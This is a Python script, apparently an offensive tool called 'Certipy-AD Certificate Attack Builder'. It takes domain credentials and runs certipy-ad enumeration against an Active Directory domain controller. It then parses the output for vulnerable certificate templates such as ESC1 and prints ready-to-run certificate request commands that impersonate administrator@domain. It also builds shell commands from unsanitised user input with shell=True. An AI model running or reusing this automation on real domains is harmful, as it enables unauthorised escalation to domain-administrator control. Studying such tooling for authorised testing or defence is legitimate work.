#!/usr/bin/env python3
import subprocess
import re
import sys
import os
import glob
import json

# Ops hook (safe no-op if c2itall not available)
try:
    sys.path.insert(0, os.path.expanduser("~/tools/c2itall"))
    from utils.ops_hook import OpsHook as _OpsHook
except ImportError:
    _OpsHook = None

def run_command(cmd):
    """Run a command and return its output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "Command timed out", 1

def read_latest_certipy_files():
    """Read the latest certipy output files"""
    txt_files = glob.glob("*_Certipy.txt")
    json_files = glob.glob("*_Certipy.json")
    
    txt_content = ""
    json_content = {}
    
    if txt_files:
        latest_txt = max(txt_files, key=os.path.getctime)
        try:
            with open(latest_txt, 'r', encoding='utf-8') as f:
                txt_content = f.read()
        except:
            txt_content = ""
    
    if json_files:
        latest_json = max(json_files, key=os.path.getctime)
        try:
            with open(latest_json, 'r', encoding='utf-8') as f:
                json_content = json.load(f)
        except Exception as e:
            print(f"[!] Error reading JSON: {e}")
            # Try reading as text and debugging
            try:
                with open(latest_json, 'r', encoding='utf-8') as f:
                    raw_content = f.read()
                    pass  # raw content available for debugging if needed
            except:
                pass
            json_content = {}
    
    return txt_content, json_content

def parse_cas_from_json(json_data):
    """Extract CAs from JSON data - looking for CA Name field"""
    cas = []
    try:
        if "Certificate Authorities" in json_data:
            ca_section = json_data["Certificate Authorities"]
            if isinstance(ca_section, dict):
                for key, ca_info in ca_section.items():
                    if isinstance(ca_info, dict) and "CA Name" in ca_info:
                        cas.append(ca_info["CA Name"])
    except Exception as e:
        print(f"[!] Error parsing CAs: {e}")
    return cas

def parse_templates_from_json(json_data):
    """
    Extract templates and identify vulnerabilities:
    - ESC1: Enrollee Supplies Subject = True + Enabled + User can enroll
    - ESC2/ESC3: Look in [*] Remarks section
    - User Enrollable: Look for [+] User Enrollable Principals
    """
    all_templates = []
    vulnerable_templates = []
    user_enrollable_templates = []
    esc1_templates = []
    
    try:
        if "Certificate Templates" in json_data:
            template_section = json_data["Certificate Templates"]
            if isinstance(template_section, dict):
                for template_key, template_info in template_section.items():
                    if isinstance(template_info, dict) and "Template Name" in template_info:
                        template_name = template_info["Template Name"]
                        all_templates.append(template_name)
                        
                        # Check if enabled
                        is_enabled = template_info.get("Enabled", False)
                        
                        # Check for ESC1: Enrollee Supplies Subject + enabled
                        enrollee_supplies = template_info.get("Enrollee Supplies Subject", False)
                        if enrollee_supplies and is_enabled:
                            esc1_templates.append(template_name)
                            vulnerable_templates.append(f"{template_name} (ESC1)")
                        
                        # Check for vulnerabilities in [*] Remarks
                        if "[*] Remarks" in template_info:
                            remarks = template_info["[*] Remarks"]
                            if isinstance(remarks, dict):
                                for remark_key in remarks.keys():
                                    if "ESC" in str(remark_key):
                                        if template_name not in [v.split(' ')[0] for v in vulnerable_templates]:
                                            vulnerable_templates.append(f"{template_name} ({remark_key.split()[0]})")
                        
                        # Check for [+] User Enrollable Principals
                        if "[+] User Enrollable Principals" in template_info:
                            user_enrollable_templates.append(template_name)
                            
    except Exception as e:
        print(f"[!] Error parsing templates: {e}")
    
    return all_templates, vulnerable_templates, user_enrollable_templates, esc1_templates

def parse_targets_from_json(json_data):
    """Extract CA DNS names for targeting"""
    targets = []
    try:
        if "Certificate Authorities" in json_data:
            ca_section = json_data["Certificate Authorities"]
            if isinstance(ca_section, dict):
                for key, ca_info in ca_section.items():
                    if isinstance(ca_info, dict) and "DNS Name" in ca_info:
                        targets.append(ca_info["DNS Name"])
    except Exception as e:
        print(f"[!] Error parsing targets: {e}")
    return targets

def parse_esc_vulnerabilities(json_data):
    """Extract ESC vulnerabilities from CA and template remarks"""
    esc_vulns = []
    try:
        # CA level ESC (like ESC8)
        if "Certificate Authorities" in json_data:
            ca_section = json_data["Certificate Authorities"]
            if isinstance(ca_section, dict):
                for key, ca_info in ca_section.items():
                    if isinstance(ca_info, dict) and "[*] Remarks" in ca_info:
                        remarks = ca_info["[*] Remarks"]
                        if isinstance(remarks, dict):
                            for remark_key in remarks.keys():
                                if "ESC" in str(remark_key):
                                    esc_vulns.append(remark_key)
        
        # Template level ESC
        if "Certificate Templates" in json_data:
            template_section = json_data["Certificate Templates"]
            if isinstance(template_section, dict):
                for template_key, template_info in template_section.items():
                    if isinstance(template_info, dict) and "[*] Remarks" in template_info:
                        remarks = template_info["[*] Remarks"]
                        if isinstance(remarks, dict):
                            for remark_key in remarks.keys():
                                if "ESC" in str(remark_key):
                                    esc_vulns.append(remark_key)
                                    
    except Exception as e:
        print(f"[!] Error parsing ESC vulnerabilities: {e}")
    
    return list(set(esc_vulns))

def get_template_permissions(json_data, template_name):
    """Get who can enroll in this template"""
    try:
        if "Certificate Templates" in json_data:
            template_section = json_data["Certificate Templates"]
            if isinstance(template_section, dict):
                for template_key, template_info in template_section.items():
                    if isinstance(template_info, dict) and template_info.get("Template Name") == template_name:
                        # Look for enrollment rights
                        permissions = template_info.get("Permissions", {})
                        if isinstance(permissions, dict):
                            enrollment_perms = permissions.get("Enrollment Permissions", {})
                            if isinstance(enrollment_perms, dict):
                                enrollment_rights = enrollment_perms.get("Enrollment Rights", [])
                                return enrollment_rights if isinstance(enrollment_rights, list) else []
    except Exception as e:
        print(f"[!] Error getting permissions for {template_name}: {e}")
    return []

def get_enabled_templates(json_data):
    """Get list of enabled templates"""
    enabled_templates = []
    try:
        if "Certificate Templates" in json_data:
            template_section = json_data["Certificate Templates"]
            if isinstance(template_section, dict):
                for template_key, template_info in template_section.items():
                    if isinstance(template_info, dict):
                        template_name = template_info.get("Template Name", "")
                        is_enabled = template_info.get("Enabled", False)
                        if is_enabled and template_name:
                            enabled_templates.append(template_name)
    except Exception as e:
        print(f"[!] Error getting enabled templates: {e}")
    return enabled_templates

def main():
    # Ops hook
    _hook = _OpsHook("certipy-enum") if _OpsHook else None
    if _hook:
        _hook.register()

    print("=" * 60)
    print("CERTIPY-AD CERTIFICATE ATTACK BUILDER v2.3")
    print("=" * 60)
    
    # Get user input
    username = input("Enter username (user@domain.com): ")
    password = input("Enter password: ")
    dc_ip = input("Enter DC IP: ")
    
    print("\n[*] Running certipy-ad enumeration...")

    # Pass password via environment variable — keeps it out of process list and logs
    os.environ['_CERTIPY_PASS'] = password
    find_cmd = f"certipy-ad find -username {username} -password \"$_CERTIPY_PASS\" -dc-ip {dc_ip}"
    vuln_cmd = f"certipy-ad find -username {username} -password \"$_CERTIPY_PASS\" -dc-ip {dc_ip} -vulnerable"

    # Run basic enumeration
    print("[*] Finding Certificate Authorities and basic info...")
    stdout, stderr, returncode = run_command(find_cmd)

    if returncode != 0:
        os.environ.pop('_CERTIPY_PASS', None)
        print(f"[!] Error running certipy-ad find: {stderr}")
        return

    # Run vulnerability scan
    print("[*] Scanning for vulnerable templates...")
    vuln_stdout, vuln_stderr, vuln_returncode = run_command(vuln_cmd)
    os.environ.pop('_CERTIPY_PASS', None)
    
    # Read the saved files
    print("[*] Reading certipy output files...")
    txt_content, json_content = read_latest_certipy_files()
    
    if not json_content:
        print("[!] No JSON data found. Check the certipy output files manually.")
        return
    
    # Parse results from JSON
    cas = parse_cas_from_json(json_content)
    all_templates, vulnerable_templates, user_enrollable_templates, esc1_templates = parse_templates_from_json(json_content)
    targets = parse_targets_from_json(json_content)
    esc_vulns = parse_esc_vulnerabilities(json_content)
    enabled_templates = get_enabled_templates(json_content)
    
    # Display results
    print("\n" + "=" * 60)
    print("ENUMERATION RESULTS")
    print("=" * 60)
    
    print(f"\n[+] CERTIFICATE AUTHORITIES ({len(cas)} found):")
    for i, ca in enumerate(cas, 1):
        print(f"    {i}. {ca}")
    
    print(f"\n[+] CA TARGETS/DNS NAMES ({len(targets)} found):")
    for i, target in enumerate(targets, 1):
        print(f"    {i}. {target}")
    
    print(f"\n[+] ESC VULNERABILITIES FOUND ({len(esc_vulns)} found):")
    for esc in esc_vulns:
        print(f"    - {esc}")
    
    print(f"\n[+] VULNERABLE TEMPLATES ({len(vulnerable_templates)} found):")
    for i, template in enumerate(vulnerable_templates, 1):
        print(f"    {i}. {template}")
    
    print(f"\n[+] USER ENROLLABLE TEMPLATES ({len(user_enrollable_templates)} found):")
    for i, template in enumerate(user_enrollable_templates, 1):
        permissions = get_template_permissions(json_content, template)
        perms_str = ', '.join(permissions) if permissions else "Check manually"
        print(f"    {i}. {template} -> {perms_str}")
    
    print(f"\n[+] ESC1 TEMPLATES (Enrollee Supplies Subject) ({len(esc1_templates)} found):")
    for i, template in enumerate(esc1_templates, 1):
        print(f"    {i}. {template}")
    
    print(f"\n[+] ENABLED TEMPLATES ({len(enabled_templates)} found):")
    for i, template in enumerate(enabled_templates[:10], 1):
        print(f"    {i}. {template}")
    if len(enabled_templates) > 10:
        print(f"    ... and {len(enabled_templates) - 10} more enabled templates")
    
    # Build attack commands
    if cas and targets:
        domain = username.split('@')[1] if '@' in username else 'company.com'
        
        print("\n" + "=" * 60)
        print("RECOMMENDED ATTACK COMMANDS")
        print("=" * 60)
        
        ca_name = cas[0]
        target_name = targets[0]
        
        # Priority: ESC1 templates, then user enrollable, then common enabled ones
        priority_templates = []
        
        # Add ESC1 templates first (highest priority)
        for template in esc1_templates:
            if template not in priority_templates:
                priority_templates.append(template)
        
        # Add user enrollable templates
        for template in user_enrollable_templates:
            if template not in priority_templates:
                priority_templates.append(template)
        
        # Add common templates if they're enabled
        common_templates = ["User", "Machine", "WebServer", "AutoenrolledUser"]
        for template in common_templates:
            if template in enabled_templates and template not in priority_templates:
                priority_templates.append(template)
        
        # Limit to top 5
        priority_templates = priority_templates[:5]
        
        if not priority_templates:
            priority_templates = enabled_templates[:3]
        
        print(f"\n[*] Using CA: {ca_name}")
        print(f"[*] Using Target: {target_name}")
        print(f"[*] Domain Controller: Use {dc_ip} for authentication after getting certificate")
        
        for i, template in enumerate(priority_templates, 1):
            permissions = get_template_permissions(json_content, template)
            print(f"\n[{i}] Template: {template}")
            if permissions:
                print(f"    Permissions: {', '.join(permissions)}")
            else:
                print(f"    Permissions: Check manually")
            
            cmd = f"certipy-ad req -username {username} -password '{password}' -ca '{ca_name}' -target {target_name} -template '{template}' -upn administrator@{domain}"
            print(f"    Command: {cmd}")
        
        print(f"\n[*] Output files created:")
        txt_files = glob.glob("*_Certipy.txt")
        json_files = glob.glob("*_Certipy.json")
        for f in sorted(txt_files[-2:] + json_files[-2:]):
            print(f"    - {f}")
    
    else:
        print("\n[!] Insufficient data found for building attack commands.")
        print("    Try running the commands manually with known templates.")

if __name__ == "__main__":
    main()